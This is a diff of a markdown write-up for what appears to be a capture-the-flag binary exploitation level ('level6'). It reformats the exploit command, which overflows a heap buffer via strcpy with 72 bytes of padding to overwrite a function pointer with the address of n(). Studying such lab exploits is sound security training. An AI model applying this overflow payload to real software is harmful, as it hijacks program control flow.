@@ -88,8 +88,9 @@ Replace the address pointed by `fn_ptr` to `n()` through a `strcpy()` heap-based
 
 ## Exploit
 
-./level6 $(printf "c%.0s" {1..72}; printf "%b" "\124\204\004\010")
+```sh
+# We write down the address of `n()` with a 72 char padding.
+$ /level6 "$(printf "%72c%b" "c" "\124\204\004\010")"
+```
 
-
-
-...
+And there we are.
